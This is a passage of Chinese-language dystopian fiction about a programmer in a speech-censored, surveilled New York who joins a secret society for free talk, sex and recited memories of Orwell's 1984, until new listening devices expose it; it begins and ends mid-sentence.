巴地把自己的情况说了一遍，当谈到自己的爱好时候，他一时间居然想不到自己喜好什么，似乎什么都没有，在那之前他甚至从来没想过。</p><p>“那，你最想做的是什么事呢？”阿尔特弥斯把手再一次放在他肩上，诱导着问道。</p><p>“真的什么都可以？”</p><p>“什么都可以，在这里没有任何限制。”</p><p>阿瓦登觉得自己终于找到机会了，他咳了一声，抓抓头，脱口而出一句响亮的叫喊：“FUXKYOU, YOUSONOFBITCH！”</p><p>在一瞬间，在座的四个人都被他这句话震惊了。瓦格纳率先反应了过来，他先叼住雪茄，用力鼓掌，然后用右手把雪茄取下来，张嘴大声地赞叹道：“真棒，痛快，这简直是最完美的入会誓词。”</p><p>“我宁可听十遍这样的脏话，也不想再去碰那个乏味的电子女声。”兰斯洛特也是一脸陶醉，毫不掩饰自己对电子女声的厌恶。而阿尔特弥斯和杜拉丝全都咯咯地笑起来，杜拉丝发现自己的笑容幅度大了一点，不好意思地把嘴掩住。阿瓦登觉得他们与其说是觉得新奇，不如说是在享受这句脏话所带来的对体制的蔑视与挑战。</p><p>“那你叫希望自己叫什么名字呢？” 阿尔特弥斯歪着头问。</p><p>“唔……王二。“ 阿瓦登沉吟了一下，回答说。这是一个中式的名字，他以前有一个中国人朋友，喜欢讲故事，故事里的主角名字总是叫王二。</p><p>屋子里的气氛现在完全融洽了，大家都开始谈些比较自然的话题，每个人都摆出了最舒服的姿势，阿尔特弥斯不时拿起茶壶来为大家续水。阿瓦登紧张的心情逐渐放松下来，他感觉到自己的脑子前所未有地轻松。</p><p>“你知道的。”阿尔特弥斯又给他倒了一杯甜水，“我们一直想把说话会保持在一定规模，平日是没有办法畅所欲言的，我们需要空间。麻烦的是，我们没办法公开征集会员，又不可能直接通过物理接触去寻找，那风险太大。于是兰斯洛特就设计了一套暗示系统，只有发现这些暗示的人才能知道本会的存在。”</p><p>“这套系统考虑到的还不止是安全问题。”兰斯洛特把自己的眼镜摘下来仔细擦拭了一下，得意地说，“这其实也是一个会员资格验证。说话会所吸纳的成员，必须有智慧，有头脑，内心渴望激情，并且对自由有着渴望。”</p><p>瓦格纳用两根指头夹着雪茄，在事先准备好的烟灰缸里弹了弹烟灰，大声说道：“据我的经验，申请BBS论坛服务的人，大多数都是为了怀旧，或者说渴望一些新鲜的东西，这样的人往往都怀有激情，认为BBS论坛也许能给他们一些与现实不一样的东西——当然，事实上并非如此，美国政府对BBS论坛的管理甚至严厉过电子邮件——这暗示着他们心里渴望解脱束缚。因此我们将暗示隐藏在申请BBS论坛的光盘之中，只有申请人才有机会接触到这些暗示。而只有那些有智慧、观察敏锐的人才会发觉到这些暗示的存在，并顺利解读出来，找到这里。”</p><p>“归根到底，说话会也不过是一群渴望自由说话的秘密小团体罢了。”兰斯洛特笑道。</p><p>“你是第二个找到说话会的人，第一个是杜拉丝小姐。”</p><p>阿尔特弥斯告诉阿瓦登。阿瓦登敬佩地看了杜拉丝一眼，后者淡淡地回答道：“这没什么，这是我的工作，我的工作就是摆弄文字。”</p><p>阿瓦登想到上一周在公共汽车站碰到的那个疯狂男子，于是把这件事讲给其他成员听。听完之后，兰斯洛特摇了摇头，从嘴唇里滑出一声叹息：</p><p>“这样的事情我也是见过的，我的一个同事就是如此。所以说话会的存在是必要的，这是缓解压力的阀门。长时间的敏感词汇限制会让人都疯掉的，因为他们既无法思考又没办法表达。”</p><p>“这正是美国政府有关部门所希望看到的，这样只有傻瓜能够存活下来，一个全是傻瓜的社会是稳定的。” 瓦格纳费力地把自己肥胖的身躯挪了一下位置，轻蔑地说。</p><p>“你也是有关部门的一分子，瓦格纳先生。”阿尔特弥斯一边往茶杯里续了些热水，一边抬头轻声说道。</p><p>“阿尔特弥斯小姐，我只是一个能比普通人多使用几个敏感词汇的普通人而已。”</p><p>大家都笑了起来。阿瓦登从来没有见过这么多的人说这么多的话，这是前所未有的奇妙经验。他惊讶地发现自己居然很快就融进了这个小圈子里，隔阂与陌生感很快就消失了；同时消失的还有胸闷与头晕等习惯性的毛病。</p><p>很快话题就从说话会本身扩展到了更加宽泛随意的话题，阿尔特弥斯唱支歌，兰斯洛特说了几个笑话，杜拉丝则给大家讲了美国南部诸州的风土人情；瓦格纳甚至还唱了一段歌剧，虽然阿瓦登一个字也听不懂，但他一点也不吝惜掌声。在这个城市的某一个被屏蔽掉的角落里，五个不甘沉默的人正在享受着在这个时代视为奢侈品的事情——说话。</p><p>“王二，你可曾看过《1984》？”</p><p>阿尔特弥斯忽然问道，她就靠着阿瓦登坐下，阿瓦登摇摇头，反问道：“这是网络编号的一段么？”</p><p>“这是一本书的名字。”</p><p>“书？”阿瓦登听到这个名词，头摇的更大了。这是个古老的名词，在这个电脑技术非常发达的时代，网络可以承载一切信息，任何人都可以在网上图书馆查到电子版；因此有关部门认为实体书籍变成了一种没有必要存在的浪费，实体书也就逐渐消亡了。瓦格纳对此的评论是：“有关部门喜欢电子书籍的心情是可以理解的，电子书籍的话，只需要FIND和REPLACE两个命令就可以消灭掉全部不健康词汇，替一本书消毒；而实体书籍的校对与修订却是件旷日持久的工作。”</p><p>“这是一本伟大的书，是旧世界哲人们对我们这个时代的预言。”阿尔特弥斯认真地说。“它很早以前就洞察到了肉的束缚与解脱，灵的束缚与解脱，这是说话会的基石。”</p><p>阿瓦登不无惊奇地发现他的网络编号开头恰好是这这本书名字：19842015。</p><p>“那么，该怎么样才能看到呢？”阿瓦登盯着阿尔特弥斯乌黑色的眼睛问。</p><p>“我们也无法找到纸质版，网络图书馆不可能存在这样的书。”兰斯洛特摇摇头，然后重新露出笑容，左手向着杜拉丝摆了个请的姿势，“但我们的杜拉丝小姐应该为她的记忆力而自豪，她在很早已经有幸阅读过这两本书，并且能够记得里面的大部分文字。”</p><p>“太好了，然后她写下来了，对吗？”</p><p>“那太危险，这时代持有实体书是个大罪过，也容易让说话会暴露。我们只是在每次聚会的时候请杜拉丝小姐为我们背诵。既然是说话会，那么把这两个故事讲出来不是更名符其实吗？”</p><p>大家都安静下来，杜拉丝站起来走到屋子中央，其他四个人坐在旁边看着她。阿瓦登不经意地把手搂在阿尔特弥斯肩上，后者微微朝这边靠过来，女性头发的幽香“咝咝”地划过他的鼻子，让他的心里一阵荡漾。屋子里非常暖和，他分不清这是花香还是阿尔特弥斯的味道。</p><p>杜拉丝的声音并不高，不过却很清晰有力；她的记忆力确实惊人，不仅记得情节，包括一些细节和句子都可以复述下来。杜拉丝讲到了朱丽亚假装摔倒，然后偷偷递给温斯顿一张写着“我爱你”的纸条，绘声绘色，这让听众们都听的入神了，阿尔特弥斯听的尤其认真，以至于都没有注意到阿瓦登一直注视着她。</p><p>“1984的作者预见到了专制的进步，却没有预见到技术的进步。”瓦格纳在杜拉丝停下来喝水的时候发表自己的评论，阿瓦登觉得他与外貌不太相称，是个很有洞察力的技术官僚。</p><p>“在大洋国人们还可以靠传递纸条来偷偷表达自己的想法，但是现在不一样了。美国政府有关部门把我们全赶到了网上，而在网络技术发达的今天，我们即使想发一条短信都会被系统或者网管看的一清二楚，无从遁形。现实里呢，还有旁观者在。”瓦格纳在腿上敲了敲雪茄根部，“一句话，技术是中性的，但技术的进步会让自在的世界更自在，集权的世界更加集权。”</p><p>“这句话说的很有哲学家的味道哟。”阿尔特弥斯冲瓦格纳挤了挤眼睛，从抽屉里取来一把饼干和曲奇散发给大家。</p><p>“就好象同样是0和1，有的人就能写出工具软件，有人却拿那个编出恶性病毒？”</p><p>阿瓦登想到一个类似的比喻，瓦格纳听了以后满意地打了个响指。</p><p>“很不错的比喻，王二，就是如此，真不愧是程序员。”</p><p>谈话持续了不知道有多久，杜拉斯看了一眼墙壁上的挂钟，连忙提醒谈兴正浓的四个人时间快到了。说话会不能持续很长时间，旁听者被屏蔽的越久，暴露的危险就越大。</p><p>“那么好吧，我们就抓紧最后半个小时来完成今天的活动。”</p><p>阿尔特弥斯一边说着，一边将桌子上的空杯子收走。兰斯洛特和瓦格纳也都站起身来，活动一下已经有些酸疼的肩膀和腰，只有杜拉丝坐在位子上没有动。</p><p>“活动？还有什么活动？”</p><p>阿瓦登奇怪地问道，说话会除了说话还有其他活动？</p><p>“唔，对啊，我们还有其他活动。”阿尔特弥斯撩起额前的长发，对他妩媚一笑：“我们还会和对方完全交流。”</p><p>“完全交流？”</p><p>“就是intercourse”</p><p>“………………”阿瓦登一下子变的脸色苍白，呼吸急促起来，仿佛胃里被灌进去零下三十度的寒风，他几乎不相信自己的耳朵。</p><p>“说话会有说话的自由，也有选择与谁上床的自由。”阿尔特弥斯毫不羞涩地说，“我们互相谈话，然后选择合适的人做爱，就象我们选择我们喜欢的词汇说话一样。”</p><p>兰斯洛特看阿瓦登很窘迫，走过去拍拍他的肩膀，慢慢地说：“当然，我们不会强迫任何人，这完全是在自愿的基础上。今天我还要早点回去照顾小孩，你们人数正好合适。”</p><p>阿瓦登的脸色涨红，热的仿佛夏季的电脑CPU，他甚至不敢多看阿尔特弥斯一眼。他憧憬过女性很长时间，但如此接近还是第一次。</p><p>还要回家去照顾小孩子的兰斯洛特向大家道别后就先行离去了，阿尔特弥斯将房间留给瓦格纳与杜拉丝，然后带着惶恐不安的阿瓦登来到了另外一间房间。这间显然是阿尔特弥斯的卧室，屋子里很简单，但却收拾的十分干净，在床上枕头旁还摆着一个手制的布娃娃，床单和窗帘都是粉红色的。</p><p>最初的是由阿尔特弥斯主动开始的，丝毫没心理准备的阿瓦登只是被动地任她摆布。经过了几轮挑逗，阿瓦登才逐渐放开，任由潜藏在自己心内的原始欲望奔流出来，那种期待听到圆润女声的青春憧憬本来只是苦闷生活的意淫，而在今天它加倍实现了。很快这种憧憬与他在现实中被压抑的郁闷合流，转化成了猛烈的冲动，让他一次又一次与阿尔特弥斯融为一体。阿瓦登不知道这种冲动和他想大声说出“FUXKYOU, YOUSONOFBITCH”冲动有什么不同，不过现在不是考虑这个的时候，他现在脑子里想的只有尽情地、全无束缚地让自己释放激情，完全没有任何束缚。</p><p>强烈的刺激一波波地冲击着兴奋中枢，最终一阵快感浪潮在狂暴洋面扬起头来，达到了一个极高的顶端。阿瓦登在那一瞬间感觉到了前所未有的自由，那种轻盈无比的自由，以及因自由而生的快乐与疲惫。浑身是汗的他喘息着倒在了阿尔特弥斯身上，一阵舒畅的倦意如潮水般淹没了他的身体……</p><p>……当他醒来的时候，发现阿尔特弥斯躺在自己身边，赤裸的身体好象一尊白玉雕像，睡姿恬美静谧。他侧过身子去，慵懒地打了个呵欠，然后阿尔特弥斯睁开了眼睛。</p><p>“很舒服，对不对？”她问道。</p><p>“是啊……”阿瓦登不知道该说什么好，他顿了顿，犹豫地说道：“你以前和兰斯洛特、瓦格纳他们也……呃，我是说，象刚才那样子过吗？”</p><p>“是的。”阿尔特弥斯温柔地回答，她半支起胳膊，长发从肩膀披到了胸口。她的大方坦白反而让阿瓦登有些不知所措。屋子里出现了一段时间的沉默，然后阿尔特弥斯忽然开口问道：</p><p>“还记得今天杜拉丝讲的那段故事吗？女主角偷偷递给男主角写着“我爱你”的纸条。”</p><p>“唔，还记得。”阿瓦登回答，很高兴终于能从那个拙劣的话题摆脱出来了。</p><p>“在有关部门的健康互联网络词汇列表里，没有爱这个字呢。在我们这个时代，我爱你也是一个敏感词汇，被屏蔽掉了。”阿尔特弥斯的眼神里似乎是感慨，又象是失落。</p><p>“我爱你。”阿瓦登不禁脱口而出，他知道在这间屋子里可以说出任何自己想说的话，不必顾忌。</p><p>“谢谢你。”</p><p>阿尔特弥斯听到之后只是笑了笑，起身穿上衣服，催促阿瓦登时间差不多了。阿瓦登有些失望，因为她没有预期反应的热烈，仿佛他刚才说的只是有些无关紧要的东西。</p><p>这时候杜拉丝和瓦格纳已经离开了，屋子里只剩他们两个人。阿尔特弥斯把他送到门口，将旁观者交给他，然后叮嘱他说：“记得在外面绝对不要提及说话会的任何事情或者任何人，我们在说话会以外的地方是完全不认识的。”</p><p>“我记住了。”阿瓦登回答，然后转身要走。</p><p>“王二。”</p><p>阿尔特弥斯忽然叫道，阿瓦登连忙转身，还没等他反应过来，两片柔软温暖的嘴唇忽然贴到了他的双唇，然后是一个细切的声音在耳边响起：“谢谢你，我爱你。”</p><p>阿瓦登觉得眼睛有些湿润，他戴上旁观者，推开门，重新步入到那一片令人窒息的世界中去，但他此时已与来时的心境大不相同。</p><p>此后阿瓦登的精神面貌明显有了改善。他谨慎地享受着这种秘密集会的乐趣，并且乐在其中。每一周或者两周，他们五个人都会在周日秘密地举行说话会的活动，聊天，唱歌或者听杜拉丝讲1984的故事。阿瓦登同阿尔特弥斯又“完全交流”了几次，偶尔他也会跟杜拉丝“交流”。他有了两个身份，一个是现实中和网上的阿瓦登，编号19842015，还有一个是说话会里的王二。他很享受这个名字，觉得这就是自己另外的一个人生。</p><p>有一次集会，他们谈到了敏感词汇的问题。阿瓦登记得很早的时候——他对这方面的记忆有点模糊——有关部门给出的是一份敏感词汇列表，由网站的内部管理人员秘密参考使用，他对如何演变成现在的局面大惑不解。那一天瓦格纳带了一瓶葡萄酒，兴致很高，于是索性给他们讲了讲“屏蔽”的进化史，身为网管的他经常可以接触到这些资料。</p><p>在最开始美国政府只是单纯地屏蔽掉敏感词汇，但很快他们就发现这样的措施根本没有用处。很多人会采取在词组中夹杂符号或者数字的方式来绕开系统检查；于是有关部门不得不将这些近似敏感词汇也一一屏蔽掉。然而众所周知，数字与符号之间的组合方式是近乎无限的，只要你有想象力，就完全可以组合出一个新的词组而且不失掉他的原意。比如说“politic”这个词，就有“politi/c”、“政polit/ic”、“pol/itic”等近乎无限种表达方式。</p><p>当有关部门意识到这个问题时，他们采取了新的策略。既然无法辨识词组，那么就用单词屏蔽。这一举措在一开始是奏效的，违规交谈的人显著减少，但很快人们就发现可以用同音字或者谐音的方式来继续表达自己的危险思想。即使有关部门封掉全部敏感词汇的同音字，也无济于事，思想活跃的美国人充分发挥了自己的想象力，使用隐喻，借代、类比、引申及其他修辞方法，或者将一个敏感词用数个不敏感的字来代替。人类的思维方式要比电脑开阔许多。电脑屏蔽掉一条路，他们还会有更多的路可以选择。</p><p>这一场水面以下的角力看起来似乎是美国大众要取得胜利。这时候，一个具有逆向思维精神的人出现了。他的身份不明。有人说他是有关部门的主管；也有人说他是因过度使用敏感词汇而被捕的危险人士。无论他是谁，总之整个局面被扭转过来。他向有关部门建议，不再告诉大众禁止说什么，而是规定他们只能说什么，用什么方式去说。有关部门很快就心领神会，制订了新的规章制度：取消了敏感词汇列表，取而代之的是互联网络健康语言列表，并把这举措推广到了日常生活中的语言屏蔽系统中去。</p><p>这一次，大众终于处于下风。以往他们与有关部门尽情地在网络与现实中捉着迷藏，而现在他们却被有关部门扼住了咽喉。这样一来，有关部门可以有效率地掌握住言论，因为整个语言的框架都被彻底控制了。在有限的空间内，大众几乎是无计可施。</p><p>尽管如此，大众还是不屈不挠地将这场战争——或者说游戏——继续下去，他们挑选健康词汇列表中的合法字眼来表达不合法的意思：两个连续的“稳定”意思就是“反对”，“稳定”加“繁荣昌盛”则暗示“屏蔽”。美国政府不得不对这一动向保持着警惕，并日复一日地将更多的词汇从健康词汇列表里删掉，禁止大众使用。</p><p>“当然，这场战争会持续下去的。只要世界上还存在着两个不同的字或者词组，那么就可以继续自由交流——你知道莫尔斯电码吧？”</p><p>瓦格纳说到这里，拿起茶杯一饮而尽，满意地打了一个嗝。</p><p>“可是，这场战争的代价就是语言的失落。表达能力会越来越贫乏，越来越淡而无味，人们会越来越倾向于沉默，这对有关部门反而是好事。”兰斯洛特摆出一副忧虑的表情，有节奏地用指关节敲击着桌面，“这样一来，岂不就等于是大众的自由意识将语言推向死亡的边缘？真讽刺啊。按照这个趋势，有关部门是不会败的，他们会笑到最后。”</p><p>“不，不，笑这种情感他们是不会了解的。”瓦格纳淡淡地回答。</p><p>“我倒是觉得，美国是一直处于恐惧的情感之中呢，生怕人们掌握了太多的词汇，表达出太多的思想，变的难以掌握。”阿尔特弥斯说完摆出一副她在上班期间冷若冰霜的呆板脸孔，学着僵硬的腔调喊了一句：“营造健康的网络环境，美国万岁！”</p><p>杜拉丝、兰斯洛特与瓦格纳都哈哈大笑，唯一没笑的是王二（阿瓦登）。他对于兰斯洛特刚才的那句话始终耿耿于怀：大众与有关部门的对抗，其最终结局就是语言的消亡。那么他们现在这个小小的说话会，也只不过是在一列开向悬崖的列车里关上窗帘，享受坠毁前最后的宁静罢了。</p><p>不过他没有说出口，因为这太煞风景了。阿瓦登不希望破坏说话会的气氛，这对他很重要。</p><p>从说话会回到家里，阿瓦登躺在行军床上，双手枕着脑袋，陷入了沉思。自从加入说话会以后，他变的比以前更容易陷入思考。有时候他想的是这个社会、这个互联网络或者这座城市中存在的荒谬性；有时候他想的是自己的生活；还有时候他想的是阿尔特弥斯。他不知道是不是在一个压抑的世界里，人的情感会变的格外强烈，他现在陷入对阿尔特弥斯的迷恋无法自拔。阿瓦登一直很羡慕杜拉丝讲的《1984》里面的温斯顿，他和朱利亚有一间两个人独处的小屋，一个只属于他们两个人的小世界。</p><p>他在与阿尔特弥斯“完全交流”的时候曾经吐露过自己的心声，阿尔特弥斯没有直接回答，而是表示两个人的关系无法再比说话会更近一步——维持现在的状态就已经是个人行为的极限，有关部门可不会一直打瞌睡。“我们只能把感情生活压缩在每周一次的说话会活动里，这已经很奢侈了。”她对他说，同时温柔地抚摩他的胸膛。“只有在说话会里，我们才是阿尔特弥斯和王二。而在其他时间里，你是19842015，而我是19387465。”</p><p>对此，阿瓦登只能发出一声轻轻的叹息，确实他不该奢求更多。</p><p>除了感情，发生变化的还有互联网络。自从加入说话会以后，阿瓦登逐渐发现互联网表面下潜藏的一些东西。正如瓦格纳在一次活动的时候指出，普罗大众与有关部门的战争从未结束，总会有思想和言论从严厉管制的缝隙中流泻出来。阿瓦登发现，在完全公式化的EMAIL与网络论坛中其实隐藏着不少耐人寻味的细节，就好象那个title一样，存在着各式各样的密码与隐藏寓意。这些东西出自不同人的手里，样式和破译方式都不同，阿瓦登不知道那些密码背后隐藏的是怎样的内容。不过有一点可以确知的是，说话会并不是唯一的一个地下集会，瓦格纳说的对，始终还是有人在试图用“健康”词汇表达“不健康”思想。</p><p>讽刺的是，给阿瓦登感触最深的，是有关部门的管制。以往他只是模糊地感觉到自己被绑缚起来，现在他能清晰地看清这种束缚与压抑的脉络，以及加诸在自己身上的各种手段。在小小说话会中享受到的自在让他更加深刻地感受到在宽阔现实中的不自在。</p><p>“FUXKYOU, YOUSONOFBITCH！”</p><p>每一次的聚会，三位男士都会轻蔑地一起高喊这一句粗话。他们清楚这不会给有关部门带来什么不良影响，不过这确实很痛快。</p><p>这一周，阿瓦登特别地忙碌，他的同事因为不明原因而被屏蔽掉了，这样一来整个项目就全压在了他一个人身上。这项目是为有关部分设计一种软件，用来控制大功率主动式“旁观者”的能源分配控制。软件很复杂，他不得不每天在电脑前工作十几个小时，只有在身体实在支撑不住的时候才停下来随便吃一点东西，喝一口纯净水，困了就躺在旁边的行军床上睡上一觉，爬起来继续工作。屋子里满是浑浊的烟味与袜子脏衣服的酸臭味，阿瓦登就在这种环境下蓬头垢面地敲着键盘，并不时揉揉满布血丝的眼睛。</p><p>偏偏在这个时候屋子里的暖气坏掉了。洋灰色的暖气片从昨天开始就变的冰凉，不再有热水流动。阿瓦登检查了一下，发现并不是管道问题，而且邻居们也碰到同样的事，看来是供热系统出了问题。这一变故的正面影响是稍微淡化了屋子内的酸臭味，负面影响是整个屋子变的有如冰窖一样。紧闭的窗户和门能挡住寒风，却挡不住寒冷，低温让本来就寒酸的房间更笼罩上一层霜气。无论是那把木椅还是行军床都象是冷酷的冰雕，屋子里唯一还有些热气的就只剩下电脑。阿瓦登不得不披上所有的御寒衣物，蜷缩在床上，把电脑的散热口对准自己。</p><p>有关部门宣布“供热”和“暖气”暂时也被列入敏感词汇，于是阿瓦登没办法写信向供热部门询问，只好静待，除了用来敲键盘的指头以外，尽量保持全身一动不动，以节约热量。在停止供暖后的第四天，暖气片里终于传来“哗啦哗啦”的声音，带着热气的水开始流动，屋子里恢复了温暖，“供热”和“暖气”又可以恢复使用了。于是EMAIL与网络论坛上全都是“庆祝有关部门恢复供应暖气，急人民之所急”的帖子，EMAIL新闻组里也全是类似主题。</p><p>不过这对阿瓦登来说太晚了，他生了病，感冒，而且是重感冒。他面色苍白，全身软弱无力，头疼的象是被一枚达姆弹射入头部，只能躺在床上等医生。医生来到他家里，给他做了两三次点滴，喂了一些叫不上名字的药片，叫他静养。这一场病足足持续了数天，他不得不放弃参加这一星期的说话会，身体状况实在太差了，阿瓦登甚至怀疑自己搞不好会因此而死掉。</p><p>阿瓦登躺在床上，心里懊悔不已，说话会是他唯一的乐趣，现在他却没办法参加。他把头蒙在被子里胡思乱想，瓦格纳这一次会带什么特别的东西来呢？兰斯洛特有没有把两个孩子也领过来？还有阿尔特弥斯，他没参加的话，她会和谁“完全交流”呢？瓦格纳还是兰斯洛特？他还想到了杜拉丝，上一次的聚会里，杜拉丝讲到了温斯顿在秘密幽会的屋子里对朱丽亚说“我们已经死了”，朱丽亚附和着说“我们已经死了”，这时候第三个声音说道“你们已经死了。”</p><p>杜拉丝就讲到这里，就停住了。阿瓦登急切地想知道接下来发生了什么，第三个声音是谁，是党吗？温斯顿和朱丽亚是否会被捕，他们会有什么样的下场？不光是他，阿尔特弥斯也很希望知道后续情节的发展，不过她并没有去追问杜拉丝。</p><p>“让这成为一个悬疑，这样接下来的一周我们的生活都会在期待的乐趣中度过。”她对阿瓦登说，然后两个人继续沉溺于intercourse的快乐。</p><p>“也许他们都会死。”阿尔特弥斯在交流结束后，看着天花板说。</p><p>“也许那只是奥布林的声音，他去探望他们。”阿瓦登安慰她道，但是他的心里也不确定。</p><p>阿瓦登的病持续了十天，然后他终于痊愈了。他痊愈后的第一件事就是从床上爬起来，然后去看墙上的日历：这一天恰好是星期日，说话会活动的日子。阿瓦登已经缺席了一周，这已经令他如饥似渴，甚至做梦都在和他们一起喋喋不休地说着话——所幸他并没有说梦话的习惯，所以24小时工作的旁观者并没发出任何警报。</p><p>阿瓦登简单地洗了一下脸，用一把有些生锈的剃刀沾着肥皂仔细地刮掉脸上粗硬的胡须，然后咕噜咕噜地刷了刷牙齿，用手和毛巾沾着热水将自己蓬起的乱发压下去。因为生病，有关部门发了一些补贴给他，其中包括两块羊角面包、两瓶姜汁啤酒和一份精制砂糖。他将这些东西都用塑料布仔细包好，揣到宽大的军大衣里，打算带到说话会上去与大家分享。</p><p>今天的天气和往常一样地冷，阿瓦登把自己裹在大衣里，登上前往效率大楼的公共汽车。一路上车厢里的广播重复着“营造健康的互联网络”以及一些优秀网络用户的先进事迹；车厢前面的电子屏幕不断滚动显示着最新的健康词汇列表，一个旁观者自车顶垂下来睥睨着车内的每一个表情呆滞的人。阿瓦登坐在最后一排，望着窗外不断向后移动的建筑物与枯黄的树木发呆。</p><p>车子很快就到达了辛普森大楼附近的车站，阿瓦登下了车，把手放到怀里摸了摸塑料布包着的食物，朝着大楼走去。他在半路无意中抬起头，忽然一阵冰冷的寒流刺入他的胸腔，迫使他停住了脚步。</p><p>有什么地方不对劲！</p><p>他看到了效率大楼的第五层阿尔特弥斯家的窗户发生了一些奇怪的变化。以前阿尔特弥斯家面向大街的窗户总是挂着粉红色的窗帘，而现在窗帘则被扯到了两边，窗户大开，用肉眼可以勉强看到窗玻璃和屋子里雪白的墙壁。假如今天有说话会的话，阿尔特弥斯绝对不会把有屏蔽效果的窗帘打开。而且打开窗户这件事也绝不寻常，在这个城市里的室外空气十分浑浊，几乎不会有人会去开窗换气。</p><p>也就是说，今天并没有说话集会召开，而是发生了另外一些事情。阿瓦登望着那窗户，心情开始变的有些慌乱，他把手从兜里掏出来，叼起一支香烟，把身体靠在一根电线杆旁故做镇静，以免被行人怀疑。究竟说话会发生了什么，为什么这一周停办了呢？要知道，只要还有复数的成员能够出席，说话会就会一直办下去，难道说瓦格纳、兰斯洛特、杜拉丝和阿尔特弥斯同时无法出席？这种概率实在太小了。阿瓦登一边这样想着，一边向四周不安地张望。忽然他看到了一样东西，一个念头霎时占据了他的全部心灵，让他几乎眩晕过去。</p><p>“说话会本周不会有了，以后也不会有了。”阿瓦登嘴唇默默地蠕动着，面如死灰。</p><p>他看到在街道内侧一处不起眼的地方隐藏着一个类似雷达天线的东西，其造型很象是两个背部贴在一起的大碗。阿瓦登心里清楚这是什么东西：这正是他负责软件设计的大功率主动式“旁观者”，这造型他很熟悉。这装置可以主动发射电波去探测人们的声音，并检查其中是否存在敏感词汇。</p><p>这样的装置居然就安放在阿尔特弥斯家附近，那么就等于说话会完全暴露在了有关部门的监控之下。主动式旁观者的强大刺探电波会轻易刺穿她家中的铅质窗帘，把所有成员的话原封不动地传到有关部门耳朵里。</p><p>这是一个划时代的发明，这一技术的突破意味着有关部门可以不再被动地等待警报，可以主动出击去刺探人们在任何时间任何地点说的任何话语。阿瓦登可以想象接下来会发生什么，阿尔特弥斯他们的每一句话都被有关部门记录下来，会有机器统计出到底有多少违禁词汇被他们使用过；然后联邦警察会冲进她的屋子，将正在聚会的成员们都带走，只留下搜查过后空荡荡的房间和窗户。</p><p>阿瓦登想到这里，心如刀绞，他一点也不为自己的侥幸逃脱而感到幸运。他的胃袋翻腾起来，一种恶心的感觉从胃里直接升到嘴边，让他想吐，却又不能吐——因为“呕”也是个敏感词汇；大病初愈的孱弱身躯无法承受这种打击，象害了风寒一样颤抖起来，几乎站立不住。</p><p>他不敢继续朝前走去，仓皇地转过身去，登上另外一辆公共汽车，把嘴闭的更紧了。等阿瓦登回到自己家楼下，看到楼房附近另外一架新的主动式旁观者正在兴建中，漆黑的天线在半空舒展开来，仿佛一面巨大的蜘蛛网。看来有关部门已经着手在整个纽约市部署这种新兴高科技产品。</p><p>他不敢驻足观看，低着头从那巨大装置旁边走过，一路不停地走回家，然后把自己的脸紧紧地压在枕头里，却不敢哭出声音来，连一句“FUXKYOU, YOUSONOFBITCH”都不能说。</p><p>从那以后，阿瓦登的生活回到了普通状态——就是说和原来一样沉滞、压抑、欠缺激情，健康向上，缺乏低级趣味。兰斯洛特说过：“战争的结果就是，大众的自由意识会将语言推向死亡的边缘”，现在看来，他的预言是很准确的：说话会的覆灭，导致“说话”、“歌剧”、“完全”、“交流”几个词先后被剔除出了健康词汇列表，成为敏感词汇。</p><p>另外，虽然阿拉伯数字还能用，但“1984”这一个数字组合也被屏蔽掉了，这让包括阿瓦登在内的程序员在编写程序时不得不谨慎地检查数字是否违规，这额外增加了很多工作量，让他更加疲惫。</p><p>阿瓦登不是没有担心过，也许在某一天的深夜，他就会忽然接到一封EMAIL，让他留在家里不要动，不要试图在网络做任何动作；接着电话会响起，电子女声会把这一要求重复再重复，直到警察打开他家的大门，把他带去未知的地方，那里有未知的命运等待着他。《1984》后面的情节发展阿瓦登始终不知道，唯一知道的杜拉丝已经彻底失踪了，所以温斯顿和朱丽亚的结局始终是个谜；就好象兰斯洛特、瓦格纳、杜拉丝和阿尔特弥斯的结局一样，也不从得知。其实这两件事对于阿瓦登来说没什么本质性的区别，所以它们也可以看做是同一个谜。</p><p>其实他最担心的，是阿尔特弥斯。每次想到这个名字，阿瓦登就难以抑制心中的郁闷。她究竟会怎么样，彻底被屏蔽掉吗？如果是那样，那么她在这世界上遗留下来的唯一痕迹，就是一个程序员记忆里的假名而已了。</p><p>说话会消失后三个星期，仍旧风平浪静，没有任何人来找过阿瓦登，他也没收到过任何类似内容的EMAIL，阿瓦登一直在想，也许是他们没有吐露出自己的下落，也可能是因为他们根本不知道——他们认识的只是一个叫王二的程序员。这个城市里有数以千计的程序员，而王二是个假名。</p><p>因此，生活一如既往地平静。不，确切地说，还是有一点不同的，那就是互联网络健康词汇列表：那上面的词组消失的速度比以前要快的快，每小时每分钟都有词与单字飞快地在名单上消失，阿瓦登不得不花上大量时间去更新列表，以跟紧当前形势。</p><p>与词汇列表更新速度相对的，EMAIL和网络论坛上的东西越来越乏味。因为人们不得不用极有限的词去表达广泛的意思，大家都变得寡言少语。就连那些秘密的暗语和联系方式也少了许多；整个网络就象是前些天阿瓦登家里出了问题的暖气片一样：虽然名义上是给人带来温暖的东西，但却变的冰冷、僵硬，让人如坠冰窟。</p><p>这一天，阿瓦登从电脑前抬起头来，他看了看窗外迷茫的灰色天空，胸口一阵抽搐，不由得痛苦地咳了一声。他拿起塑料杯，将杯子里的纯净水一饮而尽，杯子丢进同样是塑料质地的垃圾桶里，发出钝钝的撞击声，他觉得自己的脑子也是一团垃圾，举起手敲了敲，果然发出同样钝钝的撞击声。</p><p>然后他拿起大衣，戴上墨绿色的护目镜，走出门去。阿瓦登没带便携式的旁观者，那东西已经不需要了，城市里到处都是主动式的旁观者，随时监听是否有违禁词汇的存在。整个纽约现在就象是互联网络一样，被有关部门营造成十分健康。</p><p>阿瓦登这一次外出是有正当理由的，他决定去取消网络论坛服务，这服务已经用不着了，因为无论EMAIL，新闻组，BBS论坛还是其他什么现在全部都变成了一样的东西。</p><p>从日历来说现在应该是春季，但外面还是很冷，高大的灰色建筑矗立在平地上，仿佛绝对零度下的石林。大团大团的风裹着黄沙与废气穿行其间，风沙无处不在，让人置身其中而难以摆脱。阿瓦登把手揣进兜里，脖子缩进领口，畏缩着向网络部的大楼走去。</p><p>忽然，他停下了脚步，惊讶地站在原地无法动弹。他看到阿尔特弥斯正站在前面的路灯下，穿着黑色的制服。可是她的变化有多么大啊，面容象是老了十岁，满脸都是衰老的皱纹，年轻的活力荡然无存；她听到脚步声，转过头来，两个乌黑的大眼睛显得异常空洞，目光越过阿瓦登延伸到远方，没有一个明晰的焦点。</p><p>阿瓦登万万没有想到会在这个时间这个地点碰到她，这让他已经沉寂已久的心灵泛起了几点火花，可惜他迟钝的神经已经无法表达出“激动”这一个简单的情感了。两个人互相对视了一